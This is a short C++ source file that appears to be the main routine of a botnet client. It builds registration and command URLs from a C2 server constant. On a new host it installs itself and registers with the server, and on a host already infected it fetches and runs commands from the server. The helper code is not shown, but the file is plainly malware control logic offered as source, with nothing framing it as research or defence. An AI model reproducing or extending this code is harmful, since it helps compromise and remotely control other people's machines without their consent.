#include <stdio.h>
#include <experimental/filesystem>
#include <fstream>
#include <string>

#include "bot.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

int main() {
    std::string register_url, command_url;

    fs::path install_dir = util::GetInstallDir();
    Bot host(install_dir);

    register_url = C2_SERVER + REGISTER_URI;
    command_url = C2_SERVER + CMD_URI;

    if (host.IsNew()) {
        host.Install();
        host.RegisterBot(register_url);
    } else {
        host.ExecuteCommand(command_url);
    }

    return 0;
}
